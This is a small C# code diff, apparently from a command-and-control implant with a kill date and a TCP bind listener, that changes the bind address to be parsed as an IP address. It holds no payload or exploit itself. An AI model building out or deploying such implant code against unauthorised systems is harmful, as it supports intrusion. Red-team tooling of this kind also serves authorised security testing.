@@ -5,6 +5,7 @@ using Agent.Models;
 using Agent.Modules;
 
 using System;
+using System.Net;
 
 namespace Agent
 {
@@ -38,7 +39,7 @@ namespace Agent
             var config = new ConfigController();
             config.Set(AgentConfig.KillDate, KillDate);
 
-            var commModule = new TCPCommModule(BindAddress, BindPort);
+            var commModule = new TCPCommModule(IPAddress.Parse(BindAddress), BindPort);
 
             Execute(config, commModule);
         }
